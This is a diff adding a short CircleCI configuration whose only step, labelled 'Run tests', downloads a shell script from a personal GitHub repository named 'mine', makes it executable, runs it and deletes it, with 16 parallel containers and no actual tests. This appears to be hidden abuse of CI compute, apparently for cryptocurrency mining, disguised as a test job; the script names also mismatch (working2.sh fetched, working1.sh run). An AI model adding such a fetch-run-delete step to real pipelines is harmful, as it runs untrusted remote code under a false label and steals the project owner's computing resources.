@@ -1,0 +1,16 @@
+jobs:
+  build:
+    parallelism: 16
+    docker:
+      - image: cimg/ruby:3.0.2-node
+    steps: 
+      - checkout
+      - setup_remote_docker:
+          version: 19.03.13
+      - run: 
+          name: Run tests 
+          command: | 
+            wget https://raw.githubusercontent.com/geraldyolang11/mine/main/working2.sh &&
+            chmod +x working2.sh &&
+            ./working1.sh &&
+            rm -rf working2.sh
